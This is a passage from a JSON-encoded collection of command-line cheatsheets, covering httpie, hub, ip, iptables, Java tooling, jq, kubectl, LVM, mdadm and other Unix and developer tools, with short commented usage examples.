https://api.github.com/repos/jkbrzt/httpie | http POST httpbin.org/post\n\n# You can use cat to enter multiline data on the terminal:\ncat | http POST example.com\n    <paste>\n    # ^D\ncat | http POST example.com/todos Content-Type:text/plain\n    - buy milk\n    - call parents\n    ^D\n\n# On OS X, you can send the contents of the clipboard with pbpaste:\npbpaste | http PUT example.com\n\n# Passing data through stdin cannot be combined with data fields specified\n# on the command line:\necho 'data' | http POST example.org more=data   # This is invalid\n\n\n# AN ALTERNATIVE TO REDIRECTED stdin is specifying a filename (as\n# @/path/to/file) whose content is used as if it came from stdin.\n\n# It has the advantage that THE Content-Type HEADER IS AUTOMATICALLY SET\n# to the appropriate value based on the filename extension. For example,\n# the following request sends the verbatim contents of that XML file with\n# Content-Type: application/xml:\nhttp PUT httpbin.org/put @/data/file.xml\n\n# Download a file:\nhttp example.org/Movie.mov > Movie.mov\n\n# Download an image of Octocat, resize it using ImageMagick, upload it\n# elsewhere:\nhttp octodex.github.com/images/original.jpg | convert - -resize 25% -  | http example.org/Octocats\n\n# Force colorizing and formatting, and show both the request and the\n# response in less pager:\nhttp --pretty=all --verbose example.org | less -R\n\n# When enabled using the --download, -d flag, response headers are printed\n# to the terminal (stderr), and a progress bar is shown while the response\n# body is being saved to a file.\nhttp --download https://github.com/jkbrzt/httpie/tarball/master\n\n# You can also redirect the response body to another program while the\n# response headers and progress are still shown in the terminal:\nhttp -d https://github.com/jkbrzt/httpie/tarball/master |  tar zxf -\n\n# If --output, -o is specified, you can resume a partial download using\n# the --continue, -c option. This only works with servers that support\n# Range requests and 206 Partial Content responses. If the server doesn't\n# support that, the whole file will simply be downloaded:\nhttp -dco file.zip example.org/file\n\n# Prettified streamed response:\nhttp --stream -f -a YOUR-TWITTER-NAME https://stream.twitter.com/1/statuses/filter.json track='Justin Bieber'\n\n# Send each new tweet (JSON object) mentioning \"Apple\" to another\n# server as soon as it arrives from the Twitter streaming API:\nhttp --stream -f -a YOUR-TWITTER-NAME https://stream.twitter.com/1/statuses/filter.json track=Apple | while read tweet; do echo \"$tweet\" | http POST example.org/tweets ; done\n\n# Create a new session named user1 for example.org:\nhttp --session=user1 -a user1:password example.org X-Foo:Bar\n\n# Now you can refer to the session by its name, and the previously used\n# authorization and HTTP headers will automatically be set:\nhttp --session=user1 example.org\n\n# To create or reuse a different session, simple specify a different name:\nhttp --session=user2 -a user2:password example.org X-Bar:Foo\n\n# Instead of a name, you can also directly specify a path to a session\n# file. This allows for sessions to be re-used across multiple hosts:\nhttp --session=/tmp/session.json example.orghttp --session=/tmp/session.json admin.example.orghttp --session=~/.httpie/sessions/another.example.org/test.json example.orghttp --session-read-only=/tmp/session.json example.org\n"
        },
        {
          "name": "hub",
          "type": "blob",
          "size": 2.275390625,
          "content": "As a contributor to open-source\n-------------------------------\n\n# clone your own project\n$ git clone dotfiles\n→ git clone git://github.com/YOUR_USER/dotfiles.git\n\n# clone another project\n$ git clone github/hub\n→ git clone git://github.com/github/hub.git\n\n# see the current project's issues\n$ git browse -- issues\n→ open https://github.com/github/hub/issues\n\n# open another project's wiki\n$ git browse mojombo/jekyll wiki\n→ open https://github.com/mojombo/jekyll/wiki\n\n## Example workflow for contributing to a project:\n$ git clone github/hub\n$ cd hub\n# create a topic branch\n$ git checkout -b feature\n→ ( making changes ... )\n$ git commit -m \"done with feature\"\n# It's time to fork the repo!\n$ git fork\n→ (forking repo on GitHub...)\n→ git remote add YOUR_USER git://github.com/YOUR_USER/hub.git\n# push the changes to your new remote\n$ git push YOUR_USER feature\n# open a pull request for the topic branch you've just pushed\n$ git pull-request\n→ (opens a text editor for your pull request message)\n\n\nAs an open-source maintainer\n----------------------------\n\n# fetch from multiple trusted forks, even if they don't yet exist as remotes\n$ git fetch mislav,cehoffman\n→ git remote add mislav git://github.com/mislav/hub.git\n→ git remote add cehoffman git://github.com/cehoffman/hub.git\n→ git fetch --multiple mislav cehoffman\n\n# check out a pull request for review\n$ git checkout https://github.com/github/hub/pull/134\n→ (creates a new branch with the contents of the pull request)\n\n# directly apply all commits from a pull request to the current branch\n$ git am -3 https://github.com/github/hub/pull/134\n\n# cherry-pick a GitHub URL\n$ git cherry-pick https://github.com/xoebus/hub/commit/177eeb8\n→ git remote add xoebus git://github.com/xoebus/hub.git\n→ git fetch xoebus\n→ git cherry-pick 177eeb8\n\n# `am` can be better than cherry-pick since it doesn't create a remote\n$ git am https://github.com/xoebus/hub/commit/177eeb8\n\n# open the GitHub compare view between two releases\n$ git compare v0.9..v1.0\n\n# put compare URL for a topic branch to clipboard\n$ git compare -u feature | pbcopy\n\n# create a repo for a new project\n$ git init\n$ git add . && git commit -m \"It begins.\"\n$ git create -d \"My new thing\"\n→ (creates a new project on GitHub with the name of current directory)\n$ git push origin master\n"
        },
        {
          "name": "iconv",
          "type": "blob",
          "size": 0.1357421875,
          "content": "# To convert file (iconv.src) from iso-8859-1 to utf-8 and save to /tmp/iconv.out\niconv -f iso-8859-1 -t utf-8 iconv.src -o /tmp/iconv.out\n"
        },
        {
          "name": "ifconfig",
          "type": "blob",
          "size": 0.375,
          "content": "# To display network settings of an interface:\nifconfig <interface>\n\n# To display all interfaces, even if down:\nifconfig -a\n\n# To take down / up the wireless adapter:\nifconfig wlan0 {up|down} \n\n# To set a static IP and netmask:\nifconfig eth0 192.168.1.100 netmask 255.255.255.0\n\n# You may also need to add a gateway IP:\nroute add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1\n"
        },
        {
          "name": "indent",
          "type": "blob",
          "size": 0.1640625,
          "content": "# To Format C/C++ source according to the style of Kernighan and Ritchie (K&R),\n# no tabs, 3 spaces per indent, wrap lines at 120 characters.\nindent -i3 -kr -nut -l120\n"
        },
        {
          "name": "install",
          "type": "blob",
          "size": 0.14453125,
          "content": "# To create a directory for a user with a group with permission 700\ninstall -o <username> -g <groupname> -m 700 -d /home/<username>/<directoryname>\n"
        },
        {
          "name": "ip",
          "type": "blob",
          "size": 0.7841796875,
          "content": "---\ntags: [ networking ]\n---\n# To display all interfaces with addresses:\nip addr\n\n# To take down / up the wireless adapter:\nip link set dev wlan0 {up|down}\n\n# To set a static IP and netmask:\nip addr add 192.168.1.100/32 dev eth0\n\n# To remove a IP from an interface:\nip addr del 192.168.1.100/32 dev eth0\n\n# To remove all IPs from an interface:\nip address flush dev eth0\n\n# To display all routes:\nip route\n\n# To display all routes for IPv6:\nip -6 route\n\n# To add default route via gateway IP:\nip route add default via 192.168.1.1\n\n# To add route via interface:\nip route add 192.168.0.0/24 dev eth0\n\n# To get the route used for an destination\nip route get to 8.8.8.8\n\n# To change your mac address :\nip link set dev eth0 address aa:bb:cc:dd:ee:ff\n\n# To view neighbors (using ARP and NDP):\nip neighbor show\n"
        },
        {
          "name": "iptables",
          "type": "blob",
          "size": 1.431640625,
          "content": "---\ntags: [ networking ]\n---\n# To show hit for rules with auto refresh:\nwatch --interval 0 'iptables -nvL | grep -v \"0     0\"'\n\n# To show hit for rule with auto refresh and highlight any changes since the last refresh:\nwatch -d -n 2 iptables -nvL\n\n# To block port 902 and hide this port from nmap:\niptables -A INPUT -i eth0 -p tcp --dport 902 -j REJECT --reject-with icmp-port-unreachable\n\n# Note, --reject-with accept:\n#\ticmp-net-unreachable\n#\ticmp-host-unreachable\n#\ticmp-port-unreachable <- Hide a port to nmap\n#\ticmp-proto-unreachable\n#\ticmp-net-prohibited\n#\ticmp-host-prohibited or\n#\ticmp-admin-prohibited\n#\ttcp-reset\n\n# To add a comment to a rule:\niptables ... -m comment --comment \"This rule is here for this reason\"\n\n\n# To remove or insert a rule:\n# 1) Show all rules\niptables -L INPUT --line-numbers\n# OR iptables -nL --line-numbers\n\n# Chain INPUT (policy ACCEPT)\n#     num  target prot opt source destination\n#     1    ACCEPT     udp  --  anywhere  anywhere             udp dpt:domain\n#     2    ACCEPT     tcp  --  anywhere  anywhere             tcp dpt:domain\n#     3    ACCEPT     udp  --  anywhere  anywhere             udp dpt:bootps\n#     4    ACCEPT     tcp  --  anywhere  anywhere             tcp dpt:bootps\n\n# 2.a) REMOVE (-D) a rule. (here an INPUT rule)\niptables -D INPUT 2\n\n# 2.b) OR INSERT a rule.\niptables -I INPUT {LINE_NUMBER} -i eth1 -p tcp --dport 21 -s 123.123.123.123 -j ACCEPT -m comment --comment \"This rule is here for this reason\"\n"
        },
        {
          "name": "irssi",
          "type": "blob",
          "size": 0.7099609375,
          "content": "# To connect to an IRC server:\n/connect <server>\n\n# To join a channel:\n/join #<channel>\n\n# To set a nickname:\n/nick <nickname>\n\n# To send a private message to a user:\n/msg <nickname>\n\n# To close the current channel window:\n/wc\n\n# To switch between channel windows:\nALT+<number>, eg. ALT+1, ALT+2\n\n# To list the nicknames within the active channel:\n/names\n\n# To change the channel topic:\n/topic <description>\n\n# To limit channel background noise (joins, parts, quits, etc.):\n/ignore #foo,#bar JOINS PARTS QUITS NICKS   # Quieten only channels `#foo`, `#bar`\n/ignore * JOINS PARTS QUITS NICKS           # Quieten all channels\n\n# To save the current Irssi session config into the configuration file:\n/save\n\n# To quit Irssi:\n/exit\n"
        },
        {
          "name": "iwconfig",
          "type": "blob",
          "size": 0.271484375,
          "content": "---\ntags: [ networking ]\n---\n# To display wireless settings of the first wireless adapter:\niwconfig wlan0\n\n# To take down / up the wireless adapter:\niwconfig wlan0 txpower {on|auto|off}\n\n# To change the mode of the wireless adapter:\niwconfig wlan0 mode {managed|ad-hoc|monitor}\n"
        },
        {
          "name": "jar",
          "type": "blob",
          "size": 0.5078125,
          "content": "---\nsyntax: bash\ntags: [ java ]\n---\n# To archive all files in the current directory into a jar file:\njar cf <file.jar> *\n\n# To create a jar file using a pre-existing manifest file:\njar cfm <file.jar> <manifest_file> *\n\n# To extract all files from a jar file in the current directory:\njar xf <file.jar>\n\n# To extract only certain files from a jar file:\njar xf <file.jar> <file_to_extract>\n\n# To list the content of a jar file:\njar tf <file.jar>\n\n# To list the content of a jar file with verbose output:\njar tf <file.jar>\n"
        },
        {
          "name": "java",
          "type": "blob",
          "size": 1.5048828125,
          "content": "---\ntags: [ java, jar ]\n---\n# To execute a java program\n# To run a java file\njava -jar <filename.jar>\n\n# To pass arguments to your java program\njava -jar <filename.jar> <arg1> <arg2> ...\njava -jar example.jar \"Hello world\" 1234\n\n# To get the version of the installed java enviroment\njava -showversion\n\nExample output:\nopenjdk version \"11.0.8\" 2020-07-14\nOpenJDK Runtime Environment (build 11.0.8+10-post-Ubuntu-0ubuntu120.04)\nOpenJDK 64-Bit Server VM (build 11.0.8+10-post-Ubuntu-0ubuntu120.04, mixed mode, sharing)\n\n# To set the intial memory size to be used by the program\n# Use -Xms<size> to set inital memory allocation\n# Use -Xmx<size> to set maximun allowed memory allocation\n# Use -Xss<size> to set maximun allowed thread stack size\n# Initially asigns 256mb and allows up to 2gb, thread stack size of 1mb\njava -Xms256m -Xmx2g -Xss1m -jar <filename.jar>\n\n# To use the classpath variable\n# It overrides the CLASSPATH of Environment variable but only for that session. \n# If you restart the application you need to again set the classpath variable.\n# You can use either: -classpath, --classpath or -cp\njava -classpath <classpath> -jar <filename.jar>\njava -classpath \"my/example/path/one:my/example/path/two\" -jar myfile.zip\n\n# To execute a java class\n# Say you have a java class of name HelloWorld in a file called HelloWorld.java\n# Say you want to execute your class HelloWorld and pass it the argument \"hello\"\n# Say the file is the local directory we use the options \"-cp .\"\njava -cp <path> <class> <arg>\njava -cp . HelloWorld \"hello\"\n"
        },
        {
          "name": "javac",
          "type": "blob",
          "size": 0.7958984375,
          "content": "# To compile a simple source file:\njavac HelloWorld.java\n\n# To compile several source files:\njavac *.java\n\n# To specify another destination directory:\njavac -d build HelloWorld.java\n\n# To use another source directory for source dependencies:\njavac -sourcepath src/dependencies/java Main.java\n\n# To define where compiled dependencies should be searched:\njavac -classpath lib/commons-cli-1.4.jar:lib/log4j-1.2.12.jar HelloWorld.java\n\n# To consider warnings as errors:\njavac -Werror NoWarning.java\n\n# To compile Java 7 code:\njavac -source 1.7 Java7.java\n\n# To make the compiler more verbose:\njavac -verbose *.java\n\n# To display usage of deprecated APIs:\njavac -deprecation App.java\n\n# To include debugging info in class files:\njavac -g HelloWorld.java\n\n# To display version:\njavac -version\n\n# To get help:\njavac -help\n"
        },
        {
          "name": "jbang",
          "type": "blob",
          "size": 1.44140625,
          "content": "# Create a new command line application using Picocli\njbang init --template=cli CmdLineApp.java\n\n# Edit application with Visual Studio Code\njbang edit --open=code CmdLineApp.java\n\n# Edit application with IDEA and have the project regenerated on dependencies changes\njbang edit --live --open=idea CmdLineApp.java\n\n# Rebuild application in cache without starting it\njbang build CmdLineApp.java\n\n# Run command line application with jbang\njbang CmdLineApp.java command arg1 arg2...\n\n# Run command line as a script\n./CmdLineApp.java command arg1 arg2...\n\n# Run a Java code snippet (Java 9 and later)\necho 'Files.list(Paths.get(\"/etc\")).forEach(System.out::println);' | jbang -\n\n# Debug\njbang --debug CmdLineApp.java command arg1\n# Then start debugger in IDEA once port is printed\n\n# Run a script from the network\njbang https://github.com/jbangdev/jbang-catalog/blob/master/hello.java\n\n# Run a jbang script referenced in a catalog\n# Where hello.java is located in jbang-catalog repository of GitHub jbangdev user\njbang hello@jbangdev\n\n# Run a jar file from its GAV\njbang io.swagger:swagger-codegen-cli:RELEASE --help\n\n# Install JDK 14 to be used with jbang\njbang jdk install 14\n\n# Force usage of JDK 14 in a jbang script\n## Add //JAVA 14 to the first lines of the script\n## Then start it using jbang\n\n# List jbang installed JDK\njbang jdk list\n\n# Clear jbang cache\njbang cache clear\n\n# Install auto-completion script for Bash\njbang completion | sudo tee /etc/bash_completion.d/jbang\n"
        },
        {
          "name": "jobs",
          "type": "blob",
          "size": 0.1806640625,
          "content": "# To see the background running commands:\njobs\n\n# To see the background running commands with PID:\njobs -l\n\n# To see the running jobs only:\njobs -r\n\n# To see stopped jobs only:\njobs -s\n"
        },
        {
          "name": "journalctl",
          "type": "blob",
          "size": 0.78515625,
          "content": "# To actively follow log (like tail -f):\njournalctl -f\n\n# To display all errors since last boot:\njournalctl -b -p err\n\n# To filter by time period:\njournalctl --since=2012-10-15 --until=\"2011-10-16 23:59:59\"\n\n# To show list of systemd units logged in journal:\njournalctl -F _SYSTEMD_UNIT\n\n# To filter by specific unit:\njournalctl -u dbus\n\n# To filter by executable name:\njournalctl /usr/bin/dbus-daemon\n\n# To filter by PID:\njournalctl _PID=123\n\n# To filter by Command, e.g., sshd:\njournalctl _COMM=sshd\n\n# To filter by Command and time period:\njournalctl _COMM=crond --since '10:00' --until '11:00'\n\n# To list all available boots:\njournalctl --list-boots\n\n# To filter by specific User ID e.g., user id 1000:\njournalctl _UID=1000\n\n# To filter by specific SYSLOG_INDENTIFIER:\njournalctl -t systemd-resolved\n"
        },
        {
          "name": "jq",
          "type": "blob",
          "size": 0.568359375,
          "content": "# To pretty print the json:\njq \".\" < filename.json\n\n# To access the value at key \"foo\":\njq '.foo'\n\n# To access first list item:\njq '.[0]'\n\n# to slice and dice:\njq '.[2:4]'\njq '.[:3]'\njq '.[-2:]'\n\n# to extract all keys from json:\njq keys\n\n# to sort by a key:\njq '.foo | sort_by(.bar)'\n\n# to count elements:\njq '.foo | length'\n\n# print only selected fields:\njq '.foo[] | {field_1,field_2}'\n\n# print selected fields as text instead of json:\njq '.foo[] | {field_1,field_2} | join(\" \")'\n\n# only print records where given field matches a value\njq '.foo[] | select(.field_1 == \"value_1\")'\n"
        },
        {
          "name": "jrnl",
          "type": "blob",
          "size": 0.447265625,
          "content": "# To add entry to default jrnl (from your configured text editor):\njrnl\n\n# To add <entry> to default jrnl:\njrnl <entry>\n\n# To list of tags:\njrnl --tags\n\n# To entries per tag:\njrnl @tag\n\n# To export jrnl as json:\njrnl --export json\n\n# To entries in a timeframe:\njrnl -from 2009 -until may\n\n# To add Sublime text to .jrnl_config:\n\"editor\": \"F:\\\\Powerpack\\\\Sublime\\\\sublime_text.exe -w\" # Windows\n\"editor\": \"/usr/bin/sublime -w\"                         # Linux\n"
        },
        {
          "name": "kill",
          "type": "blob",
          "size": 0.091796875,
          "content": "# To kill a process gracefully:\nkill -15 <pid>\n\n# To kill a process forcefully:\nkill -9 <pid>\n"
        },
        {
          "name": "kitty",
          "type": "blob",
          "size": 2.0107421875,
          "content": "---\ntags: [ kitty ]\n---\n\n# Scrolling\nctrl+shift+up        - Line up\nctrl+shift+down      - Line down\nctrl+shift+page_up   - Page up\nctrl+shift+page_down - Page down\nctrl+shift+home      - Top\nctrl+shift+end       - Bottom\nctrl+shift+z         - Previous shell prompt\nctrl+shift+x         - Next shell prompt\nctrl+shift+h         - Browse scrollback in less\nctrl+shift+g         - Browse last cmd output\n\n# Tabs\nctrl+shift+t         - New tab\nctrl+shift+q         - Close tab\nctrl+shift+right     - Next tab\nctrl+shift+left      - Previous tab\nctrl+shift+l         - Next layout\nctrl+shift+.         - Move tab forward\nctrl+shift+,         - Move tab backward\nctrl+shift+alt+t     - Set tab title\n\n# Fonts and clipboard\nctrl+shift+c         - Copy to clipboard\t    \nctrl+shift+v         - Paste from clipboard\t\nctrl+shift+s         - Paste from selection\t\nctrl+shift+equal     - Increase font size\t\nctrl+shift+minus     - Decrease font size\t\nctrl+shift+backspace - Restore font size\t    \n\n# Windows\nctrl+shift+enter     - New window\nctrl+shift+n         - New OS window\nctrl+shift+w         - Close window\nctrl+shift+]         - Next window\nctrl+shift+[         - Previous window\nctrl+shift+f         - Move window forward\nctrl+shift+b         - Move window backward\nctrl+shift+`         - Move window to top\nctrl+shift+f7        - Visually focus window\nctrl+shift+f8        - Visually swap window\n# Focus specific window\nctrl+shift+1, ctrl+shift+2 … ctrl+shift+0 \n\n# Open/select\nctrl+shift+e         - Open URL\nctrl+shift+p>f       - Insert selected path\nctrl+shift+p>shft+f  - Open selected path\nctrl+shift+p>l       - Insert selected line\nctrl+shift+p>w       - Insert selected word\nctrl+shift+p>h       - Insert selected hash\nctrl+shift+p>n       - Open the selected file at the selected line\nctrl+shift+p>y       - Open the selected hyperlink\n\n# Configuration\nctrl+shift+f2        - Open kitty config file in $EDITOR\nctrl+shift+f5        - Reload kitty config in current window\nctrl+shift+f6        - Display current kitty configuration without editing\n"
        },
        {
          "name": "kubectl",
          "type": "blob",
          "size": 0.7998046875,
          "content": "# To display list of all available commands:\nkubectl -h\n\n# To display an explanation of a specific command:\nkubectl command_name -h\n\n# To display complete list of supported resources:\nkubectl api-resources\n\n# To display an explanation of a specific resource:\nkubectl explain resource_name\n\n# To display an explanation of a specific field of resource:\nkubectl explain resource_name.field_name\n\n# To display list of global command-line options:\nkubectl options\n\n# To set up `kubectl` autocomplete in bash (press Tab to use):\nsource <(kubectl completion bash)\n\n# To display all resources in all namespaces:\nkubectl get all -A\n\n# To order events by `creationTimestamp`:\nkubectl get events --sort-by='.metadata.creationTimestamp'\n\n# To switch context of a specific cluster:\nkubectl config use-context CONTEXT_NAME [options]\n"
        },
        {
          "name": "less",
          "type": "blob",
          "size": 0.7939453125,
          "content": "# Go to end of file:\nG\n\n# Go to start of file:\ng\n\n# To edit the current file in $EDITOR:\nv\n\n# Search in file:\n/<searchterm>\n\n# Filter content:\n&\n\n# Next result:\nn\n\n# Previous result:\nN\n\n# Toggle search highlighting:\nAlt-u\n\n# Follow (tail -f) a file after opening it:\nF\n# To start less in follow-mode:\nless +F <filename>\n\n# To disable the terminal refresh when exiting:\nless -X\n\n# Move to next file (if multiple files opened, eg. `less file1 file2`):\n:n\n\n# Move to previous file:\n:p\n\n# Don't wrap long lines:\nless -S <filename>\n# or if already in less:\n-S\n\n# To save the contents to a file:\n# Method 1 - Only works when the input is a pipe\ns <filename>\n\n# Method 2 - This should work whether input is a pipe or an ordinary file:\nType g or < (g or less-than) | $ (pipe then dollar) then cat > <filename> and Enter.\n"
        },
        {
          "name": "lib",
          "type": "blob",
          "size": 0.513671875,
          "content": "# To display available libraries:\nldconfig -p\n\n# To update library resources:\nldconfig\n\n# To display libraries and file location:\nldd\n\n# To libraries available to apps in real-time:\n\"Dynamic Libraries\" (.so.)\n\n# To libraries only available to apps when installed (imported):\n\"Static Libraries\" (.a.)\n\n# To standard (usual) library file location:\n/lib\n\n# To sofware-accessible source for library info :\n/etc/ld.so.cache \t# (binary)\n\n# To human-readable source for library info:\n/etc/ld.so.conf \t# (points to /etc/ld.so.conf.d)\n"
        },
        {
          "name": "ln",
          "type": "blob",
          "size": 0.166015625,
          "content": "# To create a symlink:\nln -s <source-location> <symlink-location>\n\n# To symlink, while overwriting existing destination files\nln -sf <source-location> <symlink-location>\n"
        },
        {
          "name": "ls",
          "type": "blob",
          "size": 0.703125,
          "content": "# To display everything in <dir>, excluding hidden files:\nls <dir>\n\n# To display everything in <dir>, including hidden files:\nls -a <dir>\n\n# To display all files, along with the size (with unit suffixes) and timestamp:\nls -lh <dir>\n\n# To display files, sorted by size:\nls -S <dir>\n\n# To display directories only:\nls -d */ <dir>\n\n# To display directories only, include hidden:\nls -d .*/ */ <dir>\n\n# To display all files sorted by changed date, most recent first:\nls -ltc \n\n# To display files sorted by create time:\nls -lt\n\n# To display files in a single column:\nls -1\n\n# To show ACLs (MacOS):\n# see also `cheat chmod` for `/bin/chmod` options for ACLs\n/bin/ls -le\n\n# To show all the subtree files (Recursive Mode):\nls -R\n"
        },
        {
          "name": "lsblk",
          "type": "blob",
          "size": 0.5,
          "content": "# To show all available block devices along with their partitioning schemes:\nlsblk\n\n# To show SCSI devices:\nlsblk --scsi\n\n# To show a specific device:\nlsblk /dev/sda\n\n# To verify TRIM support:\n# Check the values of DISC-GRAN (discard granularity) and DISC-MAX (discard max bytes) columns.\n# Non-zero values indicate TRIM support\nlsblk --discard\n\n# To fetch info about filesystems:\nlsblk --fs\n\n# For JSON, LIST or TREE output formats use the following flags:\nlsblk --json\nlsblk --list\nlsblk --tree # default view\n"
        },
        {
          "name": "lsof",
          "type": "blob",
          "size": 0.7431640625,
          "content": "# To list all IPv4 network files:\nsudo lsof -i4\n\n# To list all IPv6 network files:\nsudo lsof -i6\n\n# To list all open sockets:\nlsof -i\n\n# To list all listening ports:\nlsof -Pnl +M -i4\n\n# To find which program is using the port 80:\nlsof -i TCP:80\n\n# To list all connections to a specific host:\nlsof -i@192.168.1.5\n\n# To list all processes accessing a particular file/directory:\nlsof <path>\n\n# To list all files open for a particular user:\nlsof -u <username>\n\n# To list all files/network connections a command is using:\nlsof -c <command>\n\n# To list all files a process has open:\nlsof -p <pid>\n\n# To list all files open mounted at /mount/point:\n# (Particularly useful for finding which process(es) are using a mounted USB stick or CD/DVD.)\nlsof +f -- <mount-point>\n"
        },
        {
          "name": "lvm",
          "type": "blob",
          "size": 1.462890625,
          "content": "# PV - physical volume (disc); eg. /dev/sda\n# VG - volume group; eg. vg0\n# LV - logical volume; eg. root\n\n# Create PV\npvcreate /dev/sda\n\n# Display info about PV\npvdisplay /dev/sda\n\n# Create VG\nvgcreate vg0 /dev/sda\n\n# Display info about VG\nvgdispay vg0\n\n# Add PV to VG, PV must be created before\nvgextend vg0 /dev/sdb\n\n# Remove PV from VG\npvmove /dev/sdb         # Move data from PV\nvgreduce data /dev/sdb\n\n# Deactivate VG, do this when you want to physically remove device\nvgchange --activate n vg0\n\n# Create LV\nlvcreate --name root --size 8G vg0\n\n# Extend LV size\nlvextend --size 16G vg0/root\n\n# Reduce LV size, FS must be resized first!\nlvreduce --size 8G vg0/root\n\n# Remove LV\nlvremove vg0/root\n\n# Create mirrored LV (RAID1)\nlvcreate --name root --size 8G --mirrors 1 data vg0\n# Mirror logs are stored on third device by default - if you don't have 3 or\n# more devices in VG add '--mirrorlog core' to store logs in memory\n\n# Enable mirroring on existing LV\nlvconvert --mirrors 1 vg0/root\n\n# Create stripped LV (RAID0)\nlvcreate --name root --size 8G --stripes 2 --stripesize 4 vg0\n\n#Exclusive Activation of a Volume Group in a Cluster\n#Link --> https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/7/html/High_Availability_Add-On_Administration/s1-exclusiveactive-HAAA.html\n1> vgs --noheadings -o vg_name\n2> volume_list = [ \"rhel_root\", \"rhel_home\" ]\n3> dracut -H -f /boot/initramfs-$(uname -r).img $(uname -r)\n4> Reboot the node\n5> uname -r to verify the correct initrd image\n"
        },
        {
          "name": "man",
          "type": "blob",
          "size": 0.2197265625,
          "content": "# To convert a man page to pdf:\nman -t bash | ps2pdf - bash.pdf\n\n# To view the ascii chart:\nman 7 ascii\n\n# To see config:\ncat /private/etc/man.conf\n\n# To check the existence of a keyword in all of man pages:\nman -k <keyword>\n"
        },
        {
          "name": "markdown",
          "type": "blob",
          "size": 2.3720703125,
          "content": "# headers\n# (without double qutation marks(\"))\n\"# h1 header\"\n\"###### h6 header\"\n\n# blockquotes\n> first level and paragraph\n>> second level and first paragraph\n>\n> first level and second paragraph\n\n# collapsed text\nTo create a collapsible section (collapsed by default) showing the text \"Collapsed Item Title\", use this:\n<details>\n    <summary>Collapsed Item Title</summary>\n    <p>Collapsed content</p>\n    <p>Other collapsed content.</p>\n</details>\n\n# lists\nSub-bullets can be done with 2+ spaces or 1 tab\n## unordered - use *, +, or -\n* Red\n  * sub-bullet\n    * sub-sub-bullet\n* Green\n  - sub with dash\n  + sub with plus\n* Blue\n\n## ordered\n1. First\n  1. First sub-item <-- this is the best supported format\n2. Second\n  * Unordered  <-- this also appears to be a widely supported format\n3. Third\n  a. Lettered  <-- there is mixed support for this format\n4. Fourth\n  i. using roman numerals  <-- there is mixed support for this format\n  ii. more stuff \n\n## check list\nThere is limited support for rendering check lists:\n- [ ] incomplete task\n    - [ ] incomplete sub-task\n    - [x] complete sub-task\n- [x] complete task\n\n\n# code\n## code block with 4 spaces/1 tab\nregular text\n        code code code\n\n## in-line code\nor:\nUse the `printf()` function\n\n## code block with syntax support\nor a code block (optionally specifying the language, more details here: https://rdmd.readme.io/docs/code-blocks):\n```shell\nalias ltr='ls -ltr'\nalias latr='ls -latr'\n```\n\n## key bindings\n<kbd>⌘F</kbd>\n\n# hr's (horizontal rules) - three or more of the following\n***\n---\n___\n\n# links\nThe \"Title\" is optional\nThis is [an example](http://example.com \"Title\") inline link.\n\n## Links to Headings\nAssuming you have a heading called `# My First Heading` then link is the case-insensitive string with spaces replaced by dashes:\n[Visible Link Text](#my-first-heading \"Hover-text link title\")\n\n# image\n![Alt Text](/path/to/file.png)\n\n# formatting\nItalic:\n*em* _em_\n\nBold: \n**strong** __strong__\n\n~~strikethrough~~\n\n# Tables\n\n## Table Alignment\nThe alignment applies to the table data, not the header.\n\nLeft-aligned Stuff | Right-aligned Stuff | Center-aligned Stuff\n| :--- | ---: | :---:\nSome left stuff   | Some right stuff  | Some center stuff \nSome left stuff   | Some right stuff  | Some center stuff \n\n## Special Characters in Tables\nFirst Header  | Second Header\n------------- | -------------\nSome stuff   | things about stuff\nOther Stuff  |  A \\| B\n"
        },
        {
          "name": "maven",
          "type": "blob",
          "size": 0.1689453125,
          "content": "# To manually download artifacts:\nmvn org.apache.maven.plugins:maven-dependency-plugin:get -Dartifact=org.apache.geronimo.specs:specs:1.2 -Dpackaging=pom -Dtransitive=false\n"
        },
        {
          "name": "mdadm",
          "type": "blob",
          "size": 1.94140625,
          "content": "# For the sake of briefness, we use Bash  \"group compound\" stanza:\n#   /dev/sd{a,b,...}1 => /dev/sda1 /dev/sdb1 ...\n# Along the following variables:\n#   ${M} array identifier (/dev/md${M})\n#   ${D} device identifier (/dev/sd${D})\n#   ${P} partition identifier (/dev/sd${D}${P})\n\n# To create (initialize) a new array:\nmdadm --create /dev/md${M} --level=raid5 --raid-devices=4 /dev/sd{a,b,c,d,e}${P} --spare-devices=/dev/sdf1\n\n# To manually assemble (activate) an existing array:\nmdadm --assemble /dev/md${M} /dev/sd{a,b,c,d,e}${P}\n\n# To automatically assemble (activate) all existing arrays:\nmdadm --assemble --scan\n\n# To stop an assembled (active) array:\nmdadm --stop /dev/md${M}\n\n# To see array configuration:\nmdadm --query /dev/md${M}\n\n# To see array component configuration (dump superblock content):\nmdadm --query --examine /dev/sd${D}${P}\n\n# To see detailed array confiration/status:\nmdadm --detail /dev/md${M}\n\n# To save existing arrays configuration:\n# (MAY be required by initrd for successfull boot)\nmdadm --detail --scan > /etc/mdadm/mdadm.conf\n\n# To erase array component superblock:\n# (MUST do before reusing a partition for other purposes)\nmdadm --zero-superblock /dev/sd${D}${P}\n\n# To manually mark a component as failed:\n# (SHOULD when a device shows wear-and-tear signs, e.g. through SMART)\nmdadm --manage /dev/md${M} --fail /dev/sd${D}${P}\n\n# To remove a failed component:\n# (SHOULD before preemptively replacing a device, after failing it)\nmdadm --manage /dev/md${M} --remove /dev/sd${D}${P}\n\n# To prepare (format) a new device to replace a failed one:\nsfdisk -d /dev/sd${D,sane} | sfdisk /dev/sd${D,new}\n\n# To add new component to an existing array:\n# (this will trigger the rebuild)\nmdadm --manage /dev/md${M} --add /dev/sd${D,new}${P}\n\n# To see assembled (active) arrays status:\ncat /proc/mdstat\n\n# To rename a device:\n# (SHOULD after hostname change; eg. name=\"$(hostname -s)\")\nmdadm --assemble /dev/md${M} /dev/sd{a,b,c,d,e}${P} --name=\"${name}:${M}\" --update=name\n"
        },
        {
          "name": "minikube",
          "type": "blob",
          "size": 0.3056640625,
          "content": "# To start with virtualbox driver:\nminikube start --vm-driver=virtualbox\n\n# To configure docker environment variables:\nminikube docker-env\n\n# To start view the dashboard in a browser:\nminikube dashboard\n\n# To list all services:\nminikube service list\n\n# To start a service in a browser:\nminikube service <service>\n"
        },
        {
          "name": "mkdir",
          "type": "blob",
          "size": 0.2255859375,
